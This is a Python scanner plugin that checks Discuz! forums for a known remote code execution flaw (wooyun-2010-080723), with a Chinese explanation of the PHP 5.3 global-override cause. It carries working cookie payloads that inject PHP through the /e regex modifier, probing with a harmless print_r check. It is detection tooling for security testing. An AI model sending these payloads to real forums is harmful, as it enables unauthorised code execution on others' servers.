#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Discuz!论坛(BBS)是一个采用PHP和MySQL等其他多种数据库构建的性能优异、功能全面、安全稳定的社区论坛平台: https://discuz.dismall.com
    Discuz 全局变量防御绕过导致代码执行
        wooyun-2010-080723
            Payload: https://vulhub.org/#/environments/discuz/wooyun-2010-080723/

由于php5.3.x版本里php.ini的设置里request_order默认值为GP,
    导致$_REQUEST中不再包含$_COOKIE, 
    我们通过在Cookie中传入$GLOBALS来覆盖全局变量, 可以造成代码执行漏洞。
'''

from lib.tool.md5 import random_int_1
from lib.tool import check
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {
                'path': 'viewthread.php?tid=10&extra=page%3D1',
                'headers': {'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]={RCECOMMAND};'}
            },
            {
                'path': '?tid=10&extra=page%3D1',
                'headers': {'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]={RCECOMMAND};'}
            },
            {
                'path': '',
                'headers': {'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]={RCECOMMAND};'}
            },
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': 'Discuz',
            'vul_type': 'RCE',
            'vul_id': 'wooyun-2010-080723',
        }

        for payload in self.payloads:
            random_str = str(random_int_1(6))
            RCEcommand = 'print_r(' + random_str + ')'
            
            path = payload['path']
            headers = payload['headers']
            headers['Cookie'] = headers['Cookie'].format(RCECOMMAND=RCEcommand)

            res = client.request(
                'get',
                path,
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (check.check_res(res.text, random_str, 'print_r')):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
